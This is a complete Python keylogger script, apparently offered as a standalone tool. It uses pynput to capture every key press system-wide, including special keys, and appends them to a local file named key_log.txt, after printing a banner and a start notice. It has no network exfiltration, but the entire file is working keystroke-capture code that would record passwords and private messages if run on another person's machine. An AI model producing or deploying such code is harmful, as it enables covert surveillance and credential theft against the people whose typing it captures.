from pynput import keyboard
import os
import datetime

def print_banner():
    banner = r"""
 _  __     _             _                                 
| |/ /    | |           | |                                
| ' / __ _| | _____  ___| |__   ___ _ __   ___  ___  _ __  
|  < / _` | |/ / _ \/ __| '_ \ / _ \ '_ \ / _ \/ _ \| '_ \ 
| . \ (_| |   <  __/\__ \ | | |  __/ | | |  __/ (_) | | | |
|_|\_\__,_|_|\_\___||___/_| |_|\___|_| |_|\___|\___/|_| |_|

               🛡️ Keylogger Tool
               👨‍💻 Developed by: LK
"""
    print(banner)

class KeyLogger:
    def __init__(self, log_file="key_log.txt"):
        self.log_file = log_file
        self.log_data = ""

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == key.space:
                char = ' '
            elif key == key.enter:
                char = '\n'
            else:
                char = f'[{key.name}]'
        self.log_data += char
        self.write_to_file()

    def write_to_file(self):
        with open(self.log_file, "a") as f:
            f.write(self.log_data)
        self.log_data = ""

    def start(self):
        print_banner()
        print(f"📥 Logging started... All keystrokes will be saved to '{self.log_file}'")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
